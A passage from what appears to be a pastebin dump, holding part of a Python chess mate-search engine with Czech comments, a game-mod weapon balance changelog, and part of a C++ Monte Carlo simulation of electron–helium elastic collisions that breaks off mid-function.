                                for promo in ['Q','R','B','N','A','E','C']:
                                    moves.append((r, c, nr, nc, promo if is_white else promo.lower(), None))
                            else:
                                moves.append((r, c, nr, nc, None, None))
                        if board.en_passant == (nr, nc):
                            moves.append((r, c, nr, nc, None, 'enpassant'))
            elif pt == 'K':
                for dr in [-1,0,1]:
                    for dc in [-1,0,1]:
                        if dr==0 and dc==0: continue
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Rošády
                if is_white and r==7 and c==4:
                    if 'K' in board.castling_rights and board.grid[7][5]=='.' and board.grid[7][6]=='.':
                        moves.append((7,4,7,6,None,'castle'))
                    if 'Q' in board.castling_rights and board.grid[7][3]=='.' and board.grid[7][2]=='.' and board.grid[7][1]=='.':
                        moves.append((7,4,7,2,None,'castle'))
                if not is_white and r==0 and c==4:
                    if 'k' in board.castling_rights and board.grid[0][5]=='.' and board.grid[0][6]=='.':
                        moves.append((0,4,0,6,None,'castle'))
                    if 'q' in board.castling_rights and board.grid[0][3]=='.' and board.grid[0][2]=='.' and board.grid[0][1]=='.':
                        moves.append((0,4,0,2,None,'castle'))
            else:
                # Tahy pro figury s jezdcovým pohybem (N, A, C, E)
                if pt in ['N','A','C','E']:
                    for dr, dc in knight_moves:
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                
                # Klouzavé tahy – pro R, Q, E, A
                if pt in ['R','Q','E','A']:
                    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
                
                # Diagonální tahy – pro B, Q, C, A
                if pt in ['B','Q','C','A']:
                    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
    
    return moves

def get_legal_moves(board, side):
    """"""Vrátí seznam legálních tahů pro danou stranu.""""""
    moves = generate_pseudo_moves(board, side)
    legal_moves = []
    for move in moves:
        make_move(move, board)
        if not is_in_check(board, side):
            legal_moves.append(move)
        undo_move(board)
    return legal_moves

def make_move(move, board):
    """"""Provede tah na šachovnici a uloží stav pro možnost undo.""""""
    r1, c1, r2, c2, promo, special = move
    piece = board.grid[r1][c1]
    captured = board.grid[r2][c2] if special != 'enpassant' else ('p' if piece=='P' else 'P')
    prev_state = (set(board.castling_rights), board.en_passant, board.halfmove_clock, board.fullmove_number)
    move_stack.append((r1, c1, r2, c2, promo, special, piece, captured, prev_state))
    
    # Aktualizace půltahových hodin a čísla tahu
    if piece.upper() == 'P' or captured != '.':
        board.halfmove_clock = 0
    else:
        board.halfmove_clock += 1
    
    if board.to_move == 'b':
        board.fullmove_number += 1
    
    board.grid[r1][c1] = '.'
    
    if special == 'castle':
        board.grid[r2][c2] = piece
        if piece == 'K':
            if c2 == 6:
                board.grid[7][5] = 'R'; board.grid[7][7] = '.'
            else:
                board.grid[7][3] = 'R'; board.grid[7][0] = '.'
        else:
            if c2 == 6:
                board.grid[0][5] = 'r'; board.grid[0][7] = '.'
            else:
                board.grid[0][3] = 'r'; board.grid[0][0] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = piece
        if piece == 'P':
            board.grid[r2+1][c2] = '.'
        else:
            board.grid[r2-1][c2] = '.'
    else:
        board.grid[r2][c2] = promo if promo else piece
    
    # Aktualizace rošádových práv
    if piece == 'K':
        board.castling_rights.discard('K'); board.castling_rights.discard('Q')
    if piece == 'k':
        board.castling_rights.discard('k'); board.castling_rights.discard('q')
    if piece == 'R' and (r1, c1)==(7,7):
        board.castling_rights.discard('K')
    if piece == 'R' and (r1, c1)==(7,0):
        board.castling_rights.discard('Q')
    if piece == 'r' and (r1, c1)==(0,7):
        board.castling_rights.discard('k')
    if piece == 'r' and (r1, c1)==(0,0):
        board.castling_rights.discard('q')
    
    # En passant
    if special == 'double':
        board.en_passant = (r1 + (-1 if board.to_move=='w' else 1), c1)
    else:
        board.en_passant = None
    
    board.to_move = 'b' if board.to_move=='w' else 'w'

def undo_move(board):
    """"""Vrátí poslední provedený tah.""""""
    if not move_stack:
        print(""Chyba: Žádný tah k vrácení!"")
        return
    
    r1, c1, r2, c2, promo, special, piece, captured, prev_state = move_stack.pop()
    castling_rights, en_passant, halfmove_clock, fullmove_number = prev_state
    
    board.grid[r1][c1] = piece
    
    if special == 'castle':
        board.grid[r2][c2] = '.'
        if piece == 'K':
            if c2 == 6:
                board.grid[7][7] = 'R'; board.grid[7][5] = '.'
            else:
                board.grid[7][0] = 'R'; board.grid[7][3] = '.'
        else:
            if c2 == 6:
                board.grid[0][7] = 'r'; board.grid[0][5] = '.'
            else:
                board.grid[0][0] = 'r'; board.grid[0][3] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = '.'
        if piece == 'P':
            board.grid[r2+1][c2] = 'p'
        else:
            board.grid[r2-1][c2] = 'P'
    else:
        board.grid[r2][c2] = captured
    
    board.castling_rights = castling_rights
    board.en_passant = en_passant
    board.halfmove_clock = halfmove_clock
    board.fullmove_number = fullmove_number
    board.to_move = 'b' if board.to_move=='w' else 'w'

def move_to_notation(move, board):
    """"""Převede tah na standardní šachovou notaci.""""""
    cols = ""abcdefgh""
    r1, c1, r2, c2, promo, special = move
    
    if special == 'castle':
        return ""O-O"" if c2 > c1 else ""O-O-O""
    
    piece = board.grid[r1][c1].upper()
    is_pawn = piece == 'P'
    
    # Pro pěšce nezačínáme označením figury
    prefix = '' if is_pawn else piece
    
    # Pole
    from_square = cols[c1] + str(8 - r1)
    to_square = cols[c2] + str(8 - r2)
    
    # Proměna
    promotion = '=' + promo.upper() if promo else ''
    
    # En passant
    ep = "" e.p."" if special == 'enpassant' else ''
    
    return prefix + from_square + '-' + to_square + promotion + ep

def is_mate_in_n_plies(board, depth):
    """"""Zjistí, zda je v pozici mat v přesně 'depth' půltazích.""""""
    if depth == 0:
        # Je teď mat?
        side_to_move = board.to_move
        return is_in_check(board, side_to_move) and not get_legal_moves(board, side_to_move), None
    
    side_to_move = board.to_move
    legal_moves = get_legal_moves(board, side_to_move)
    
    # Pokud nemá tahy
    if not legal_moves:
        # Pokud je to mat nyní, není to mat v hloubce depth (musí být přesně)
        if is_in_check(board, side_to_move):
            return False, None
        # Pat - nemůže dát mat
        return False, None
    
    # Určení, zda je strana, která mate, na tahu
    mating_color = 'w'  # Předpokládejme, že bílý dává mat
    if depth % 2 == 0:
        # Pokud je sudý počet půltahů, pak je na tahu matovaná strana
        mating_color = 'b' if board.to_move == 'w' else 'w'
    else:
        # Pokud je lichý počet půltahů, pak je na tahu matující strana
        mating_color = board.to_move
    
    # Je matující strana na tahu?
    is_mating_side_to_move = (board.to_move == mating_color)
    
    if is_mating_side_to_move:
        # Matující strana hledá tah, který vede k matu
        for move in legal_moves:
            make_move(move, board)
            is_mate, _ = is_mate_in_n_plies(board, depth - 1)
            undo_move(board)
            
            if is_mate:
                return True, move
        
        # Nenašli jsme žádnou matující sekvenci
        return False, None
    else:
        # Bránící se strana hledá nejlepší obranu
        all_lead_to_mate = True
        best_defensive_move = None
        
        # Zkusíme najít tah, který oddálí mat
        for move in legal_moves:
            make_move(move, board)
            is_mate, _ = is_mate_in_n_plies(board, depth - 1)
            undo_move(board)
            
            if not is_mate:
                # Našli jsme únikový tah, který vyvrací mat v daném počtu půltahů
                all_lead_to_mate = False
                best_defensive_move = move
                break
        
        # Pokud všechny tahy vedou k matu, alespoň vybereme ten, který dává nejlepší šanci na obranu
        if all_lead_to_mate and legal_moves:
            # Tady bychom ideálně měli vybrat tah, který maximalizuje počet tahů do matu
            # Pro jednoduchost vybereme první tah, ale v reálném enginu bychom zde 
            # implementovali důkladnější analýzu
            best_defensive_move = legal_moves[0]
            
            # Pokusíme se najít tah, který oddálí mat (pokud všechny vedou k matu)
            max_depth_to_mate = -1
            for move in legal_moves:
                make_move(move, board)
                
                # Zkusíme najít mat ve všech možných hloubkách menších než aktuální
                for d in range(1, depth):
                    mate_found, _ = is_mate_in_n_plies(board, d)
                    if mate_found:
                        if d > max_depth_to_mate:
                            max_depth_to_mate = d
                            best_defensive_move = move
                        break
                
                undo_move(board)
            
        return all_lead_to_mate, best_defensive_move

def find_best_defensive_move(board, legal_moves):
    """"""Najde nejlepší obranný tah pro stranu na tahu.""""""
    if not legal_moves:
        return None
    
    # Pro krále se snažíme maximalizovat vzdálenost k soupeřovu králi
    side = board.to_move
    king_pos = find_king(board, side)
    enemy_king_pos = find_king(board, 'b' if side == 'w' else 'w')
    
    if king_pos and enemy_king_pos:
        kr, kc = king_pos
        ekr, ekc = enemy_king_pos
        
        # Pro krále hledáme tah, který maximalizuje vzdálenost mezi králi
        best_move = legal_moves[0]
        max_distance = -1
        
        for move in legal_moves:
            r1, c1, r2, c2, _, _ = move
            
            # Pokud pohybujeme králem
            if board.grid[r1][c1].upper() == 'K' and (r1, c1) == king_pos:
                # Spočítejme vzdálenost po tahu
                distance = max(abs(r2 - ekr), abs(c2 - ekc))
                
                if distance > max_distance:
                    max_distance = distance
                    best_move = move
        
        return best_move
    
    # Pokud nemáme krále nebo jiný případ, vrátíme první legální tah
    return legal_moves[0]

def find_mate_sequence(board, max_plies=20):
    """"""Najde a vypíše posloupnost tahů vedoucí k matu.""""""
    global running, start_time, move_stack
    
    # Vyčistit zásobník
    move_stack = []
    
    # Spustit časovač
    running = True
    start_time = time.time()
    timer_thread = threading.Thread(target=time_reporter)
    timer_thread.daemon = True
    timer_thread.start()
    
    try:
        # Nejprve kontrola, zda je již mat
        side_to_move = board.to_move
        legal_moves = get_legal_moves(board, side_to_move)
        
        if not legal_moves:
            if is_in_check(board, side_to_move):
                print(""\nPoziční analýza: Mat - "" + 
                      (""černý vyhrává"" if side_to_move == 'w' else ""bílý vyhrává""))
                return
            else:
                print(""\nPoziční analýza: Pat - remíza"")
                return
        
        # Zkusíme najít mat v několika tazích
        print(""\nHledám posloupnost tahů k matu..."")
        print(""\nProhledávám jednotlivé hloubky:"")
        
        for plies in range(1, max_plies + 1):
            print(f""\n--- Hloubka {plies} půltahů ---"")
            
            # Zkusíme najít mat v této hloubce
            is_mate, best_move = is_mate_in_n_plies(board, plies)
            
            if is_mate:
                print(f""\nNalezen mat v {plies} půltazích!"")
                
                # Rekonstruujeme a vypisujeme sekvenci tahů k matu
                print(""\nPosloupnost tahů k matu (s optimální obranou):"")
                variant_board = board.copy()
                
                # Vypíšeme počáteční pozici
                print(""\nVýchozí pozice:"")
                print(variant_board.display())
                print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
                print(""-"" * 30)
                
                # Proveďme první tah
                move_notation = move_to_notation(best_move, variant_board)
                make_move(best_move, variant_board)
                print(f""1. {move_notation}"")
                print(variant_board.display())
                print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
                print(""-"" * 30)
                
                # Pokud je již mat, končíme
                if not get_legal_moves(variant_board, variant_board.to_move) and is_in_check(variant_board, variant_board.to_move):
                    print(""Mat!"")
                    return
                
                # Nyní pokračujeme v rekonstrukci sekvence tahů
                curr_depth = plies - 1
                move_num = 2
                
                while curr_depth > 0:
                    # Najdeme nejlepší odpověď pro aktuální stranu na tahu
                    is_mat, next_move = is_mate_in_n_plies(variant_board, curr_depth)
                    
                    if next_move:
                        move_notation = move_to_notation(next_move, variant_board)
                        make_move(next_move, variant_board)
                        print(f""{move_num}. {move_notation}"")
                        print(variant_board.display())
                        print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
                        print(""-"" * 30)
                        
                        # Kontrola, zda je již mat
                        if not get_legal_moves(variant_board, variant_board.to_move) and is_in_check(variant_board, variant_board.to_move):
                            print(""Mat!"")
                            return
                        
                        move_num += 1
                        curr_depth -= 1
                    else:
                        # Pokud nemáme další tah v sekvenci, najdeme nejlepší tah pro aktuální stranu
                        legal_moves = get_legal_moves(variant_board, variant_board.to_move)
                        if legal_moves:
                            # Vybereme nejlepší obranný tah
                            next_move = find_best_defensive_move(variant_board, legal_moves)
                            move_notation = move_to_notation(next_move, variant_board)
                            make_move(next_move, variant_board)
                            print(f""{move_num}. {move_notation}"")
                            print(variant_board.display())
                            print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
                            print(""-"" * 30)
                            
                            move_num += 1
                            curr_depth -= 1
                        else:
                            break
                
                return
            else:
                # Pokud jsme nenašli mat v této hloubce, ukážeme posun hloubky simulací tahů
                # Vytvoříme kopii šachovnice pro simulaci
                sim_board = board.copy()
                # Pro sudé hloubky simulujeme tahy, abychom ukázali jinou pozici
                if plies > 1 and plies <= len(get_legal_moves(board, board.to_move)):
                    # Provedeme jeden tah pro ilustraci
                    sim_move = get_legal_moves(sim_board, sim_board.to_move)[0]
                    make_move(sim_move, sim_board)
                    print(""Ukázka pozice po jednom tahu:"")
                    print(sim_board.display())
                    print(f""Na tahu je {'bílý' if sim_board.to_move == 'w' else 'černý'}"")
                else:
                    # Pokud nemůžeme simulovat, aspoň zobrazíme aktuální pozici
                    print(""Aktuální pozice pro tuto hloubku:"")
                    print(board.display())
                    print(f""Na tahu je {'bílý' if board.to_move == 'w' else 'černý'}"")
        
        # Pokud nenajdeme mat, vypíšeme posloupnost tahů s nejlepšími tahy pro obě strany
        print(""\nMat nebyl nalezen v hloubce do"", max_plies, ""půltahů."")
        print(""\nPosloupnost nejlepších tahů (bez zaručeného matu):"")
        
        legal_moves = get_legal_moves(board, board.to_move)
        
        if legal_moves:
            variant_board = board.copy()
            
            # Vypíšeme počáteční pozici
            print(""\nVýchozí pozice:"")
            print(variant_board.display())
            print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
            print(""-"" * 30)
            
            # Jednoduché vyhledávání: pokusit se najít tahy vedoucí k matu nebo materiálnímu zisku
            for i in range(10):  # Max 10 tahů
                legal_moves = get_legal_moves(variant_board, variant_board.to_move)
                if not legal_moves:
                    if is_in_check(variant_board, variant_board.to_move):
                        print(""Mat!"")
                    else:
                        print(""Pat - remíza!"")
                    break
                
                # Zkusíme najít mat v 1
                best_move = None
                for move in legal_moves:
                    make_move(move, variant_board)
                    if not get_legal_moves(variant_board, variant_board.to_move) and is_in_check(variant_board, variant_board.to_move):
                        best_move = move
                        break
                    undo_move(variant_board)
                
                if best_move:
                    print(f""{i+1}. {move_to_notation(best_move, board)} (mat)"")
                    print(variant_board.display())
                    print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
                    print(""-"" * 30)
                    print(""Mat!"")
                    break
                
                # Nemáme mat, zkusíme najít braní figury
                best_move = None
                for move in legal_moves:
                    r1, c1, r2, c2, _, _ = move
                    if variant_board.grid[r2][c2] != '.':
                        best_move = move
                        make_move(move, variant_board)
                        print(f""{i+1}. {move_to_notation(move, board)} (braní)"")
                        print(variant_board.display())
                        print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
                        print(""-"" * 30)
                        break
                
                if best_move:
                    continue
                
                # Žádné braní, vybereme tah, který maximalizuje vzdálenost králů
                best_move = find_best_defensive_move(variant_board, legal_moves)
                make_move(best_move, variant_board)
                print(f""{i+1}. {move_to_notation(best_move, board)}"")
                print(variant_board.display())
                print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
                print(""-"" * 30)
    
    finally:
        # Ukončit časovač
        running = False
        if timer_thread.is_alive():
            timer_thread.join(timeout=1.0)
        print("""")  # Nový řádek po časovém výpisu

def main():
    """"""Hlavní funkce programu.""""""
    # Několik zajímavých pozic pro testování
    standard_fen = ""rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1""  # Základní pozice
    
    # Pozice s Amazonkou (A/a) - kombinuje tahy dámy a jezdce
    amazon_fen = ""8/6A1/8/8/8/k7/8/K7 w - - 0 1""  # Bílá Amazonka
    
    # Pozice s Cyrilo (C/c) - kombinuje tahy jezdce a střelce
    cyrilo_fen = ""8/8/8/8/8/kq2K3/6C1/8 w - - 0 1""
    
    # Pozice s Eve (E/e) - kombinuje tahy jezdce a věže
    eve_fen = ""8/8/8/8/8/k2E4/8/K7 w - - 0 1""
    
    # Mat Amazonkou v jednom tahu
    amazon_mate_fen = ""k7/8/1K6/8/8/8/8/A7 w - - 0 1""
    
    # Bílý dá mat v 2
    mate_in_2_fen = ""3k4/8/3K4/8/8/8/8/R7 w - - 0 1""
    
    # Pozice pro testování (můžete změnit na jinou z výše uvedených)
    test_fen = amazon_mate_fen
    
    test_fen = ""6k1/8/5a2/3K4/8/8/8/3B4 w - - 0 1""
    
    print(""Šachový engine pro hledání matových sekvencí"")
    print(""============================================"")
    
    # Načtení pozice
    board = Board(test_fen)
    print(""\nPočáteční pozice:"")
    print(board.display())
    print(f""Na tahu je {'bílý' if board.to_move == 'w' else 'černý'}"")
    
    # Najít sekvenci tahů k matu
    find_mate_sequence(board, max_plies=10)

if __name__ == ""__main__"":
    main() "
Tp5pArH8,BWR - Changelog 01/04/25,SSilver,Diff,Tuesday 1st of April 2025 11:09:15 AM CDT,"General
+ Fix to several AOE effects to not go through walls
Affected the huo-long heater in particular.

Short Circuit
+ Fixed to alt-fire charge, no longer stops weapon from firing erroneously
Primary and secondary fire uses of the weapon seemed to cause inconsistencies, thus it's been fixed and ought not to ""jam"" as it were.

Scotsman's Skullcutter
+ Fixed random crits not occurring on the weapon
Really seemed to have been caused by the last conversion of how attributes were applied, but should be resolved now.

The Classic
- Reduced move speed bonus while charging to +50% (was +100%)
It seemed the prior version of the speed boost was too powerful on the classic, so it's been 

Tribalman's Shiv
- Removed slower firing speed penalty (was -25%)
Listed previously to compensate for it used to having the crit-combo, but since it's been removed off the weapon the penalty is no longer of use.

The Bushwacka
+ Reduced deploy speed penalty to 35% slower (was 50%)
+ Removed damage vulnerability while on wearer (was 20%)
- Added 30% slower firing speed
Former downside of the weapon didn't quite the current design of the weapon that encourages combo-ing into itself. Other Options were considered, and a slower firing speed seemed to be the best fit. Lagging behind was also the deploy penalty making it too punishing, thus it was Sped up."
FfdBz98k,e-n collisions(v6) - elastic collisions as in Vahedi - just loosing energy,phystota,C++,Tuesday 1st of April 2025 10:28:55 AM CDT,"#include <iostream>
#include <random>
#include <fstream>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota


#define n_e 50000
#define Emin 0.0
#define Emax 450.0
#define E_mean 100 // mean electron energy, initial distribution
#define bin_width 0.1
#define m_e 9.1E-31 // electron mass in kg
#define k_b 1.38E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define N ( (int)((Emax-Emin)/bin_width) ) // add 1 to include E_max if needed?
#define T_n 10.0 // Helium neutral temperature in eV
#define T_e 50.0    // electron Maxwell initial distribution
#define M_n 6.6464731E-29 // Helium atom mass
#define N_He 1000000 // Helium neutrals number
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define time 5.0E-3 // 500 microsec time to equalibrate the system

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided = false;

    //initialization function // void func(Type0& t) → means the function expects a reference to variable t of type0
    // void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis) {
    //     // velocity angles in spherical coordinates
    //     double phi = 2*M_PI*dis(gen);
    //     double cosTheta = 2.0*dis(gen) - 1.0;
    //     double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 
        
    //     energy = E_mean*dis(gen);
        
    //     double speed = sqrt(2*energy*q/m_e);

    //     vx = speed * sinTheta * cos(phi);
    //     vy = speed * sinTheta * sin(phi);
    //     vz = speed * cosTheta;
    // }

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};


struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& elastic_CS) {


    if (energy < elastic_CS.front().energy) {
        std::cout << "" required energy value lower than range of cross-section data"" << ""\n"";
        return 0.0;
    }
    if (energy > elastic_CS.back().energy) {
        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < elastic_CS.size() && energy > elastic_CS[step].energy) {
            step++;
        }

    double k = (elastic_CS[step].sigma - elastic_CS[step-1].sigma)/(elastic_CS[step].energy - elastic_CS[step-1].energy);
    double m = elastic_CS[step].sigma - k*elastic_CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};




int main() {

    clock_t start = clock();

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<double> neutrals(N_He); // vector for neutrals
    std::vector<NeutralParticle> neutrals(N_He); 


    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram

    std::vector<double> elastic(N, 0); // precompiled cross-section energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::uniform_int_distribution<int> pair(0, n_e-1);
    std::uniform_int_distribution<int> neutral_pair(0, N_He-1);    


    std::ifstream elastic_cs(""cross_sections/elastic.dat"");
    if (!elastic_cs.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }    

    // --- starts reading elastic cross section datafile

    std::vector<CrossSection> elastic_CS;

    double energy, sigma;

    while (elastic_cs >> energy >> sigma) {
        elastic_CS.push_back({energy, sigma});
    }    

    elastic_cs.close();

    // --- finish reading cross-section datafile

    std::ofstream file0(""velocities.dat"");    
    std::ofstream file1(""energies.dat"");        
    std::ofstream file2(""energies_final.dat"");    

    std::ofstream file3(""histo_random.dat"");    
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""histo_maxwell.dat"");    
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""neutral_distribution.dat"");    
    std::ofstream file6(""E*f(E).dat"");    
    std::ofstream file7(""nu_max.dat"");
    std::ofstream file8(""electron_mean_energy.dat"");
    std::ofstream file9(""nu.dat"");    

    // Initialize all electrons
    for (auto& e : electrons) {
//        e.initialize(gen, dis);
        e.initialize(gen, dis, maxwell_electron);
    }
    // initialize all nenutrals
    for (auto&n : neutrals) {
        n.initialize(gen, dis, maxwell_neutral);
    }
    // precalculate cross-sections for each energy bin
    for (int i = 0; i < N; i++){
        elastic[i] = interpolate(bin_width*(i+0.5), elastic_CS);
    }


    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }

    // -----initial electrons energy distribution starts------------////
    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file3 << bin_center << "" "" <<  (i*bin_width)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // this is electron normalized distribution function
    }
    // -----initial electrons energy distribution ends------------////    

    // -----neutrals Maxwell-Boltzmann distribution starts------------////
    for (int i = 0; i < N_He; i++){
        int bin = (int)( (neutrals[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_neutral.size())
            histo_neutral[bin]++;
    }    


    for (int i = 0; i < histo_neutral.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file5 << bin_center << "" "" << static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this is real f(E) - normalized distribution
        file6 << bin_center << "" "" << bin_center*static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this should be E*f(E) 
    }   

    // -----neutrals Maxwell-Boltzmann distribution starts------------////

    // -----calculating nu-max for null-collision method starts ------------////
    double nu_max = 0.0;
    double nu_max_temp = 0.0;


    for (int i = 0; i < N; i++){
        nu_max_temp = (N_He/Volume)*elastic[i] * sqrt(2.0*(i*bin_width + bin_width/2.0)*q/m_e);
        file7 << (i+0.5)*bin_width << "" "" << nu_max_temp << ""\n"";
        if (nu_max_temp > nu_max)
            nu_max = nu_max_temp;
    }
    // -----calculating nu-max for null-collision method ends ------------////

    //----- calculating nu-average from our electron distribution starts---------///
    for (int i = 0; i < N; i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file9 << bin_center << "" "" << (N_He/Volume)*elastic[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
    }
    //----- calculating nu-average from our electron distribution ends ---------///

    double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    double steps = static_cast<int>(time/dt);

//    std::cout << steps << ""\n"";

    //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)

    int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;

//    int Ne_collided = n_e*0.98;  // in case I want to check smth


    // Generate shuffled list of electron indices
    std::vector<int> electron_indices(n_e);
    std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index
    std::shuffle(electron_indices.begin(), electron_indices.end(), gen); // shuffle the indexes    
    int reshuffle_interval = 1;
    int print_interval = 100;

    for (int t = 0; t < steps; t++){

        std::cout << ""timestep remains: "" << steps - t << ""\n"";

        //reshuffle the indices
        if (t % reshuffle_interval == 0) {
            std::shuffle(electron_indices.begin(), electron_indices.end(), gen);
        }

        // setting flags to false each timestep
        for (auto& e : electrons) e.collided = false;

        int collision_counter = 0;


        for (int idx : electron_indices) {

            if (collision_counter >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided) continue;  // Skip already collided electrons

            double electron_energy = e.energy;
            int bin_energy = static_cast<int>(electron_energy / bin_width);
            double nu_elastic = (N_He/Volume) * elastic[bin_energy] * sqrt(2.0*electron_energy*q/m_e);

            if (dis(gen) < nu_elastic/nu_max) {

                // ----   Collision energy redistribution module

                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision

                double R1 = dis(gen);
                double R2 = dis(gen);

                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);

                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction

                //calculating final velocity of electron

                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
